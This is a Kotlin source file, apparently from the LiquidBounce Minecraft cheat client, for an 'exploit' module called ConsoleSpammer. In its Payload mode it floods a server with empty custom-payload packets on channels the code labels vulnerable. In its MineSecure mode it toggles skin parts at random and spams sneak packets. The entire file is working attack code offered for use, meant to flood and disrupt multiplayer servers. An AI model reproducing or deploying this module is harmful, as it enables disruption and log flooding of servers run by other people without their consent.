package net.ccbluex.liquidbounce.features.module.modules.exploit

import io.netty.buffer.Unpooled
import net.ccbluex.liquidbounce.config.NamedChoice
import net.ccbluex.liquidbounce.event.repeatable
import net.ccbluex.liquidbounce.features.module.Category
import net.ccbluex.liquidbounce.features.module.Module
import net.minecraft.client.render.entity.PlayerModelPart
import net.minecraft.network.PacketByteBuf
import net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket
import net.minecraft.network.packet.c2s.play.CustomPayloadC2SPacket
import net.minecraft.util.Identifier
import kotlin.random.Random

object ModuleConsoleSpammer : Module("ConsoleSpammer", Category.EXPLOIT) {

    private val delay by int("Delay", 0, 0..20)
    private val modes by enumChoice("Mode", Modes.PAYLOAD, Modes.values())
    private val payload = PacketByteBuf(Unpooled.buffer())
    private val vulnerableChannels = arrayOf("MC|BEdit", "MC|BSign", "MC|TrSel", "MC|PickItem")

    val repeatable = repeatable {
        wait(delay)
        when (modes) {
            Modes.PAYLOAD -> network.sendPacket(
                CustomPayloadC2SPacket(
                    Identifier(
                        vulnerableChannels[Random.nextInt(
                            vulnerableChannels.size
                        )]
                    ), payload
                )
            )
            Modes.MINESECURE -> {
                mc.options.setPlayerModelPart(PlayerModelPart.HAT, Random.nextBoolean())
                mc.options.setPlayerModelPart(PlayerModelPart.JACKET, Random.nextBoolean())
                mc.options.setPlayerModelPart(PlayerModelPart.LEFT_PANTS_LEG, Random.nextBoolean())
                mc.options.setPlayerModelPart(PlayerModelPart.RIGHT_PANTS_LEG, Random.nextBoolean())
                mc.options.setPlayerModelPart(PlayerModelPart.LEFT_SLEEVE, Random.nextBoolean())
                mc.options.setPlayerModelPart(PlayerModelPart.RIGHT_SLEEVE, Random.nextBoolean())
                mc.options.setPlayerModelPart(PlayerModelPart.CAPE, Random.nextBoolean())

                repeat(5) {
                    network.sendPacket(
                        ClientCommandC2SPacket(
                            player,
                            ClientCommandC2SPacket.Mode.RELEASE_SHIFT_KEY
                        )
                    )
                    network.sendPacket(
                        ClientCommandC2SPacket(
                            player,
                            ClientCommandC2SPacket.Mode.PRESS_SHIFT_KEY
                        )
                    )
                }
            }
        }
    }

    private enum class Modes(override val choiceName: String) : NamedChoice {
        PAYLOAD("Payload"), MINESECURE("MineSecure")
    }
}
